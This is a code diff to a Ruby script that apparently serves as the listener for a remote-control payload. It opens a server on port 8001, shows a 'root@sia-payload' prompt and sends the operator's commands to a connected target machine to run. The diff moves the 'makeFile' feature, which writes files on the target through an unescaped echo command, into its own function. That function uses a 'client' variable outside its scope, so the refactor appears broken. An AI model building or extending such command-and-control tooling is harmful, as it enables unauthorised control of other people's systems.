@@ -66,6 +66,15 @@ puts """
                       makeFile    =>   Making file
                       
 """
+#make file def
+def makeFile()
+  name_file = Readline.readline("\n#{BOLD}[+] Enter your File name : #{RS}", true)
+  text_file = Readline.readline("\n#{BOLD}[+] Enter your Text : #{RS}", true)
+
+  finish_com = "echo #{text_file} > #{name_file}"
+  #send to target
+  client.puts(finish_com)
+end
 
 
 port = 8001
@@ -87,17 +96,8 @@ loop {                          # Servers run forever
       while com = Readline.readline("\n#{BOLD}[+] #{PURPLE}root@sia-payload#{DARK_BLUE}:~# #{RS}", true)
         #make file in target system
         if com == "makeFile"
-          name_file = Readline.readline("\n#{BOLD}[+] Enter your File name : #{RS}", true)
-          text_file = Readline.readline("\n#{BOLD}[+] Enter your Text : #{RS}", true)
-
-          if RUBY_PLATFORM =~ /win32/
-
-          else
-            finish_com = "echo #{text_file} > #{name_file}"
-            #send to target
-            client.puts(finish_com)
-          end
-
+          #init makefile def
+          makeFile()
         end
 
         client.puts(com)
